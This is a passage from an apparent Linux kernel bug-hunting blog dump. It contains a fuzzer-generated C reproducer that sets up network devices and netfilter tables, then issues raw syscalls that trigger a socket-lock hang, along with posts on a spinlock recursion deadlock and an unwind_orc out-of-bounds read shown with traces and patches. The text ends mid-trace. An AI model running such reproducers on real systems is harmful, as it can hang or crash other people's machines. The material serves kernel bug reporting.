\"ip6_vti0\",\r\n\t\t\t\t  \"ip6tnl0\", \"ip6gre0\", \"ip6gretap0\",\r\n\t\t\t\t  \"erspan0\", \"bond0\", \"veth0\", \"veth1\"};\r\n\r\n\tfor (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)\r\n\t\texecute_command(0, \"ip link add dev %s0 type %s\", devtypes[i], devtypes[i]);\r\n\texecute_command(0, \"ip link add dev veth1 type veth\");\r\n\tfor (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {\r\n\t\tchar addr[32];\r\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);\r\n\t\texecute_command(0, \"ip -4 addr add %s/24 dev %s\", addr, devnames[i]);\r\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);\r\n\t\texecute_command(0, \"ip -6 addr add %s/120 dev %s\", addr, devnames[i]);\r\n\t\tsnprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);\r\n\t\texecute_command(0, \"ip link set dev %s address %s\", devnames[i], addr);\r\n\t\texecute_command(0, \"ip link set dev %s up\", devnames[i]);\r\n\t}\r\n}\r\n\r\nstatic int read_tun(char* data, int size)\r\n{\r\n\tif (tunfd < 0)\r\n\t\treturn -1;\r\n\r\n\tint rv = read(tunfd, data, size);\r\n\tif (rv < 0) {\r\n\t\tif (errno == EAGAIN)\r\n\t\t\treturn -1;\r\n\t\tif (errno == EBADFD)\r\n\t\t\treturn -1;\r\n\t\tfail(\"tun: read failed with %d\", rv);\r\n\t}\r\n\treturn rv;\r\n}\r\n\r\nstatic void flush_tun()\r\n{\r\n\tchar data[SYZ_TUN_MAX_PACKET_SIZE];\r\n\twhile (read_tun(&data[0], sizeof(data)) != -1)\r\n\t\t;\r\n}\r\n\r\nstatic uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)\r\n{\r\n\tint ptyno = 0;\r\n\tif (ioctl(a0, TIOCGPTN, &ptyno))\r\n\t\treturn -1;\r\n\tchar buf[128];\r\n\tsprintf(buf, \"/dev/pts/%d\", ptyno);\r\n\treturn open(buf, a1, 0);\r\n}\r\n\r\n#define XT_TABLE_SIZE 1536\r\n#define XT_MAX_ENTRIES 10\r\n\r\nstruct xt_counters {\r\n\tuint64_t pcnt, bcnt;\r\n};\r\n\r\nstruct ipt_getinfo {\r\n\tchar name[32];\r\n\tunsigned int valid_hooks;\r\n\tunsigned int hook_entry[5];\r\n\tunsigned int underflow[5];\r\n\tunsigned int num_entries;\r\n\tunsigned int size;\r\n};\r\n\r\nstruct ipt_get_entries {\r\n\tchar name[32];\r\n\tunsigned int size;\r\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\r\n};\r\n\r\nstruct ipt_replace {\r\n\tchar name[32];\r\n\tunsigned int valid_hooks;\r\n\tunsigned int num_entries;\r\n\tunsigned int size;\r\n\tunsigned int hook_entry[5];\r\n\tunsigned int underflow[5];\r\n\tunsigned int num_counters;\r\n\tstruct xt_counters* counters;\r\n\tchar entrytable[XT_TABLE_SIZE];\r\n};\r\n\r\nstruct ipt_table_desc {\r\n\tconst char* name;\r\n\tstruct ipt_getinfo info;\r\n\tstruct ipt_replace replace;\r\n};\r\n\r\nstatic struct ipt_table_desc ipv4_tables[] = {\r\n    {.name = \"filter\"},\r\n    {.name = \"nat\"},\r\n    {.name = \"mangle\"},\r\n    {.name = \"raw\"},\r\n    {.name = \"security\"},\r\n};\r\n\r\nstatic struct ipt_table_desc ipv6_tables[] = {\r\n    {.name = \"filter\"},\r\n    {.name = \"nat\"},\r\n    {.name = \"mangle\"},\r\n    {.name = \"raw\"},\r\n    {.name = \"security\"},\r\n};\r\n\r\n#define IPT_BASE_CTL 64\r\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\r\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\r\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\r\n\r\nstruct arpt_getinfo {\r\n\tchar name[32];\r\n\tunsigned int valid_hooks;\r\n\tunsigned int hook_entry[3];\r\n\tunsigned int underflow[3];\r\n\tunsigned int num_entries;\r\n\tunsigned int size;\r\n};\r\n\r\nstruct arpt_get_entries {\r\n\tchar name[32];\r\n\tunsigned int size;\r\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\r\n};\r\n\r\nstruct arpt_replace {\r\n\tchar name[32];\r\n\tunsigned int valid_hooks;\r\n\tunsigned int num_entries;\r\n\tunsigned int size;\r\n\tunsigned int hook_entry[3];\r\n\tunsigned int underflow[3];\r\n\tunsigned int num_counters;\r\n\tstruct xt_counters* counters;\r\n\tchar entrytable[XT_TABLE_SIZE];\r\n};\r\n\r\nstruct arpt_table_desc {\r\n\tconst char* name;\r\n\tstruct arpt_getinfo info;\r\n\tstruct arpt_replace replace;\r\n};\r\n\r\nstatic struct arpt_table_desc arpt_tables[] = {\r\n    {.name = \"filter\"},\r\n};\r\n\r\n#define ARPT_BASE_CTL 96\r\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\r\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\r\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\r\n\r\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\r\n{\r\n\tstruct ipt_get_entries entries;\r\n\tsocklen_t optlen;\r\n\tint fd, i;\r\n\r\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\r\n\tif (fd == -1)\r\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\r\n\tfor (i = 0; i < num_tables; i++) {\r\n\t\tstruct ipt_table_desc* table = &tables[i];\r\n\t\tstrcpy(table->info.name, table->name);\r\n\t\tstrcpy(table->replace.name, table->name);\r\n\t\toptlen = sizeof(table->info);\r\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\r\n\t\t\tswitch (errno) {\r\n\t\t\tcase EPERM:\r\n\t\t\tcase ENOENT:\r\n\t\t\tcase ENOPROTOOPT:\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\r\n\t\t}\r\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\r\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\r\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\r\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\r\n\t\tmemset(&entries, 0, sizeof(entries));\r\n\t\tstrcpy(entries.name, table->name);\r\n\t\tentries.size = table->info.size;\r\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\r\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\r\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\r\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\r\n\t\ttable->replace.num_entries = table->info.num_entries;\r\n\t\ttable->replace.size = table->info.size;\r\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\r\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\r\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\r\n\t}\r\n\tclose(fd);\r\n}\r\n\r\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\r\n{\r\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\r\n\tstruct ipt_get_entries entries;\r\n\tstruct ipt_getinfo info;\r\n\tsocklen_t optlen;\r\n\tint fd, i;\r\n\r\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\r\n\tif (fd == -1)\r\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\r\n\tfor (i = 0; i < num_tables; i++) {\r\n\t\tstruct ipt_table_desc* table = &tables[i];\r\n\t\tif (table->info.valid_hooks == 0)\r\n\t\t\tcontinue;\r\n\t\tmemset(&info, 0, sizeof(info));\r\n\t\tstrcpy(info.name, table->name);\r\n\t\toptlen = sizeof(info);\r\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\r\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\r\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\r\n\t\t\tmemset(&entries, 0, sizeof(entries));\r\n\t\t\tstrcpy(entries.name, table->name);\r\n\t\t\tentries.size = table->info.size;\r\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\r\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\r\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\r\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\r\n\t\t\t\tcontinue;\r\n\t\t}\r\n\t\ttable->replace.num_counters = info.num_entries;\r\n\t\ttable->replace.counters = counters;\r\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\r\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\r\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\r\n\t}\r\n\tclose(fd);\r\n}\r\n\r\nstatic void checkpoint_arptables(void)\r\n{\r\n\tstruct arpt_get_entries entries;\r\n\tsocklen_t optlen;\r\n\tunsigned i;\r\n\tint fd;\r\n\r\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\r\n\tif (fd == -1)\r\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\r\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\r\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\r\n\t\tstrcpy(table->info.name, table->name);\r\n\t\tstrcpy(table->replace.name, table->name);\r\n\t\toptlen = sizeof(table->info);\r\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\r\n\t\t\tswitch (errno) {\r\n\t\t\tcase EPERM:\r\n\t\t\tcase ENOENT:\r\n\t\t\tcase ENOPROTOOPT:\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\r\n\t\t}\r\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\r\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\r\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\r\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\r\n\t\tmemset(&entries, 0, sizeof(entries));\r\n\t\tstrcpy(entries.name, table->name);\r\n\t\tentries.size = table->info.size;\r\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\r\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\r\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\r\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\r\n\t\ttable->replace.num_entries = table->info.num_entries;\r\n\t\ttable->replace.size = table->info.size;\r\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\r\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\r\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\r\n\t}\r\n\tclose(fd);\r\n}\r\n\r\nstatic void reset_arptables()\r\n{\r\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\r\n\tstruct arpt_get_entries entries;\r\n\tstruct arpt_getinfo info;\r\n\tsocklen_t optlen;\r\n\tunsigned i;\r\n\tint fd;\r\n\r\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\r\n\tif (fd == -1)\r\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\r\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\r\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\r\n\t\tif (table->info.valid_hooks == 0)\r\n\t\t\tcontinue;\r\n\t\tmemset(&info, 0, sizeof(info));\r\n\t\tstrcpy(info.name, table->name);\r\n\t\toptlen = sizeof(info);\r\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\r\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\r\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\r\n\t\t\tmemset(&entries, 0, sizeof(entries));\r\n\t\t\tstrcpy(entries.name, table->name);\r\n\t\t\tentries.size = table->info.size;\r\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\r\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\r\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\r\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\r\n\t\t\t\tcontinue;\r\n\t\t}\r\n\t\ttable->replace.num_counters = info.num_entries;\r\n\t\ttable->replace.counters = counters;\r\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\r\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\r\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\r\n\t}\r\n\tclose(fd);\r\n}\r\n#include <linux/if.h>\r\n#include <linux/netfilter_bridge/ebtables.h>\r\n\r\nstruct ebt_table_desc {\r\n\tconst char* name;\r\n\tstruct ebt_replace replace;\r\n\tchar entrytable[XT_TABLE_SIZE];\r\n};\r\n\r\nstatic struct ebt_table_desc ebt_tables[] = {\r\n    {.name = \"filter\"},\r\n    {.name = \"nat\"},\r\n    {.name = \"broute\"},\r\n};\r\n\r\nstatic void checkpoint_ebtables(void)\r\n{\r\n\tsocklen_t optlen;\r\n\tunsigned i;\r\n\tint fd;\r\n\r\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\r\n\tif (fd == -1)\r\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\r\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\r\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\r\n\t\tstrcpy(table->replace.name, table->name);\r\n\t\toptlen = sizeof(table->replace);\r\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\r\n\t\t\tswitch (errno) {\r\n\t\t\tcase EPERM:\r\n\t\t\tcase ENOENT:\r\n\t\t\tcase ENOPROTOOPT:\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\r\n\t\t}\r\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\r\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\r\n\t\ttable->replace.num_counters = 0;\r\n\t\ttable->replace.entries = table->entrytable;\r\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\r\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\r\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\r\n\t}\r\n\tclose(fd);\r\n}\r\n\r\nstatic void reset_ebtables()\r\n{\r\n\tstruct ebt_replace replace;\r\n\tchar entrytable[XT_TABLE_SIZE];\r\n\tsocklen_t optlen;\r\n\tunsigned i, j, h;\r\n\tint fd;\r\n\r\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\r\n\tif (fd == -1)\r\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\r\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\r\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\r\n\t\tif (table->replace.valid_hooks == 0)\r\n\t\t\tcontinue;\r\n\t\tmemset(&replace, 0, sizeof(replace));\r\n\t\tstrcpy(replace.name, table->name);\r\n\t\toptlen = sizeof(replace);\r\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\r\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\r\n\t\treplace.num_counters = 0;\r\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\r\n\t\t\ttable->replace.hook_entry[h] = 0;\r\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\r\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\r\n\t\t\treplace.entries = entrytable;\r\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\r\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\r\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\r\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\r\n\t\t\t\tcontinue;\r\n\t\t}\r\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\r\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\r\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\r\n\t\t\t\tj++;\r\n\t\t\t}\r\n\t\t}\r\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\r\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\r\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\r\n\t}\r\n\tclose(fd);\r\n}\r\n\r\nstatic void checkpoint_net_namespace(void)\r\n{\r\n\tcheckpoint_ebtables();\r\n\tcheckpoint_arptables();\r\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\r\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\r\n}\r\n\r\nstatic void reset_net_namespace(void)\r\n{\r\n\treset_ebtables();\r\n\treset_arptables();\r\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\r\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\r\n}\r\n\r\nstatic void remove_dir(const char* dir)\r\n{\r\n\tDIR* dp;\r\n\tstruct dirent* ep;\r\n\tint iter = 0;\r\nretry:\r\n\tdp = opendir(dir);\r\n\tif (dp == NULL) {\r\n\t\tif (errno == EMFILE) {\r\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\r\n\t\t}\r\n\t\texitf(\"opendir(%s) failed\", dir);\r\n\t}\r\n\twhile ((ep = readdir(dp))) {\r\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\r\n\t\t\tcontinue;\r\n\t\tchar filename[FILENAME_MAX];\r\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\r\n\t\tstruct stat st;\r\n\t\tif (lstat(filename, &st))\r\n\t\t\texitf(\"lstat(%s) failed\", filename);\r\n\t\tif (S_ISDIR(st.st_mode)) {\r\n\t\t\tremove_dir(filename);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tint i;\r\n\t\tfor (i = 0;; i++) {\r\n\t\t\tif (unlink(filename) == 0)\r\n\t\t\t\tbreak;\r\n\t\t\tif (errno == EROFS) {\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tif (errno != EBUSY || i > 100)\r\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\r\n\t\t\tif (umount2(filename, MNT_DETACH))\r\n\t\t\t\texitf(\"umount(%s) failed\", filename);\r\n\t\t}\r\n\t}\r\n\tclosedir(dp);\r\n\tint i;\r\n\tfor (i = 0;; i++) {\r\n\t\tif (rmdir(dir) == 0)\r\n\t\t\tbreak;\r\n\t\tif (i < 100) {\r\n\t\t\tif (errno == EROFS) {\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tif (errno == EBUSY) {\r\n\t\t\t\tif (umount2(dir, MNT_DETACH))\r\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tif (errno == ENOTEMPTY) {\r\n\t\t\t\tif (iter < 100) {\r\n\t\t\t\t\titer++;\r\n\t\t\t\t\tgoto retry;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\texitf(\"rmdir(%s) failed\", dir);\r\n\t}\r\n}\r\n\r\nstatic void test();\r\n\r\nvoid loop()\r\n{\r\n\tint iter;\r\n\tcheckpoint_net_namespace();\r\n\tfor (iter = 0;; iter++) {\r\n\t\tchar cwdbuf[256];\r\n\t\tsprintf(cwdbuf, \"./%d\", iter);\r\n\t\tif (mkdir(cwdbuf, 0777))\r\n\t\t\tfail(\"failed to mkdir\");\r\n\t\tint pid = fork();\r\n\t\tif (pid < 0)\r\n\t\t\tfail(\"loop fork failed\");\r\n\t\tif (pid == 0) {\r\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\r\n\t\t\tsetpgrp();\r\n\t\t\tif (chdir(cwdbuf))\r\n\t\t\t\tfail(\"failed to chdir\");\r\n\t\t\tflush_tun();\r\n\t\t\ttest();\r\n\t\t\tdoexit(0);\r\n\t\t}\r\n\t\tint status = 0;\r\n\t\tuint64_t start = current_time_ms();\r\n\t\tfor (;;) {\r\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\r\n\t\t\tif (res == pid)\r\n\t\t\t\tbreak;\r\n\t\t\tusleep(1000);\r\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\r\n\t\t\t\tkill(-pid, SIGKILL);\r\n\t\t\t\tkill(pid, SIGKILL);\r\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\tremove_dir(cwdbuf);\r\n\t\treset_net_namespace();\r\n\t}\r\n}\r\n\r\nuint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};\r\nvoid test()\r\n{\r\n\tlong res;memcpy((void*)0x20000280, \"/dev/loop-control\", 18);\r\n\tsyscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);\r\n\t*(uint64_t*)0x20000180 = 0;\r\n\t*(uint64_t*)0x20000188 = 0;\r\n\t*(uint64_t*)0x20000190 = 0;\r\n\t*(uint64_t*)0x20000198 = 0;\r\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000180, 0);\r\n\t*(uint64_t*)0x20000500 = 0x77359400;\r\n\t*(uint64_t*)0x20000508 = 0;\r\n\t*(uint64_t*)0x20000510 = 0;\r\n\t*(uint64_t*)0x20000518 = 0x989680;\r\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);\r\n\tres = syz_open_pts(-1, 0x42100);\r\n\tif (res != -1)\r\n\t\tr[0] = res;\r\n\tsyscall(__NR_ioctl, r[0], 0x5462, 0x20000140);\r\n\tsyscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);\r\n\tres = syscall(__NR_pipe2, 0x20000000, 0);\r\n\tif (res != -1) {\r\n\tr[1] = *(uint32_t*)0x20000000;\r\n\tr[2] = *(uint32_t*)0x20000004;\r\n\t}\r\n\t*(uint16_t*)0x20000040 = -1;\r\n\t*(uint16_t*)0x20000042 = 0x200;\r\n\t*(uint16_t*)0x20000044 = 0x8000;\r\n\t*(uint16_t*)0x20000046 = 0x3f;\r\n\t*(uint16_t*)0x20000048 = 0x22;\r\n\t*(uint16_t*)0x2000004a = 0x45f;\r\n\tsyscall(__NR_ioctl, r[1], 0x560a, 0x20000040);\r\n\tsyscall(__NR_fstatfs, r[1], 0x200000c0);\r\n\tsyz_open_pts(r[2], 0);\r\n\t*(uint32_t*)0x20000340 = 0x10;\r\n\tsyscall(__NR_accept, r[2], 0x20000300, 0x20000340);\r\n\tsyscall(__NR_fcntl, r[2], 4, 0x40400);\r\n}\r\n\r\nint main()\r\n{\r\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\r\n\tchar *cwd = get_current_dir_name();\r\n\tfor (;;) {\r\n\t\tif (chdir(cwd))\r\n\t\t\tfail(\"failed to chdir\");\r\n\t\tuse_temporary_dir();\r\n\t\tinitialize_tun();\r\n\t\tinitialize_netdevices();\r\n\t\tloop();\r\n\t}\r\n}\r\n```\r\n\r\n**End**\r\n\r\n","excerpt":"getsockopt - task hung in locksocknested Posting in a long time :) because of other stuff. I have a few LK bugs but skip it :). I just foun…","fields":{"slug":"/2018-02-Founds/"},"frontmatter":{"date":"Feb 14, 2018","title":"Linux Kernel - 2018-02 Founds","tags":["Security","Linux-Kernel"],"update":"Feb 24, 2018"}}},{"node":{"rawMarkdownBody":"\r\n## spin-lock recursion bug (leading to deadlock)\r\n\r\nThere's no recursion check on spinlock where I found it (not exact). So when executed recursively, deadlock is triggered.\r\nIt needs to check current and calling thread id so that avoiding deadlock at recursive cases.\r\n\r\nBelow is pseudo-code for the patch.\r\n```c\r\n# spinlock - lock\r\n\r\n...\r\nlong recursiveLockCount = 0;\r\n...\r\n\r\nif(ownThreadId == calledThreadId) {\r\n\t++recursiveLockCount;\r\n\tassert(recursiveLockCount > 0);\r\n\treturn;\r\n}\r\n...\r\n\r\n# spinlock - unlock\r\n\r\n...\r\nif(recursiveLockCount) {\r\n\tassert(ownThreadId == calledThreadId);\r\n\t--recursiveLockCount;\r\n\treturn;\r\n}\r\n...\r\n```\r\n\r\n### Call Trace (Dump)\r\n```c\r\nCall Trace:\r\n __dump_stack lib/dump_stack.c:17 [inline]\r\n dump_stack+0x104/0x1c5 lib/dump_stack.c:53\r\n spin_bug kernel/locking/spinlock_debug.c:75 [inline]\r\n debug_spin_lock_before kernel/locking/spinlock_debug.c:84 [inline]\r\n do_raw_spin_lock+0x18c/0x1d0 kernel/locking/spinlock_debug.c:112\r\n rq_lock kernel/sched/sched.h:1766 [inline]\r\n ttwu_queue kernel/sched/core.c:1863 [inline]\r\n try_to_wake_up+0x98e/0x14e0 kernel/sched/core.c:2078\r\n wake_up_worker kernel/workqueue.c:839 [inline]\r\n insert_work+0x384/0x4d0 kernel/workqueue.c:1312\r\n __queue_work+0x537/0x1160 kernel/workqueue.c:1462\r\n queue_work_on+0x8f/0xa0 kernel/workqueue.c:1487\r\n queue_work include/linux/workqueue.h:488 [inline]\r\n call_usermodehelper_exec+0x2a7/0x470 kernel/umh.c:439\r\n call_modprobe kernel/kmod.c:99 [inline]\r\n __request_module+0x3ff/0xc00 kernel/kmod.c:171\r\n inet6_create+0xc56/0x1200 net/ipv6/af_inet6.c:156\r\n __sock_create+0x4c8/0x810 net/socket.c:1265\r\n sock_create net/socket.c:1305 [inline]\r\n SYSC_socket net/socket.c:1335 [inline]\r\n SyS_socket+0xdb/0x190 net/socket.c:1315\r\n entry_SYSCALL_64_fastpath+0x1f/0x96\r\nRIP: 0033:0x4565b9\r\nRSP: 002b:00007f85ab8b2bd8 EFLAGS: 00000216 ORIG_RAX: 0000000000000029\r\nRAX: ffffffffffffffda RBX: 00007f85ab8b3700 RCX: 00000000004565b9\r\nRDX: 0000000000000004 RSI: 0000000000000800 RDI: 000000000000000a\r\nRBP: 00007ffc612e5ac0 R08: 0000000000000000 R09: 0000000000000000\r\nR10: 0000000000000000 R11: 0000000000000216 R12: 00007ffc612e5a3e\r\nR13: 00007ffc612e5a3f R14: 00007f85ab8b3700 R15: 00007f85ab8b39c0\r\n```\r\n\r\n## unwind_orc - stack out-of-bound\r\n\r\n* Read 8 bytes stack oob in unwind_next_frame\r\n\r\nI just found the bug stack OOB (8 bytes read) in unwind_orc. So, I just tested it on the latest LK (v4.15.0-rc4 currently),\r\nand it worked. But, I found the commit about this bug(?).\r\nHe (Commiter) said...\r\n\r\n> \"The ORC unwinder got confused by some kprobes changes, which isn't\r\nsurprising since the runtime code no longer matches vmlinux, and the\r\nstack was modified for kretprobes. <br />\r\nUntil we have a way for generated code to register changes with the\r\nunwinder, these types of warnings are inevitable.  So just disable KASAN\r\nchecks for stack accesses in the ORC unwinder.\"\r\n\r\nAlso, you can see it [here](https://github.com/torvalds/linux/commit/881125bfe65bb772f34f4fcb04a35dfe117e186a)\r\nIt was found & patched at LK v4.14.0-rc8 on 2017/11/8.\r\n\r\nIn short, it is intended! not a BUG. In addition, if it is a bug, it just a kinda memory disclosure useless :|.\r\n\r\n### Before & After\r\n```c\r\n@@ -279,7 +279,7 @@ static bool deref_stack_reg(struct unwind_state *state, unsigned long addr,\r\n \tif (!stack_access_ok(state, addr, sizeof(long)))\r\n \t\treturn false;\r\n \r\n-\t*val = READ_ONCE_TASK_STACK(state->task, *(unsigned long *)addr);\r\n+\t*val = READ_ONCE_NOCHECK(*(unsigned long *)addr);\r\n \treturn true;\r\n }\r\n \r\n```\r\n\r\nsee the difference? yes, READ_ONCE_TASK_STACK to READ_ONCE_NOCHECK.\r\n\r\n### Call Trace (Dump)\r\n```c\r\nBUG: KASAN: stack-out-of-bounds in deref_stack_regs arch/x86/kernel/unwind_orc.c:302 [inline]\r\nBUG: KASAN: stack-out-of-bounds in 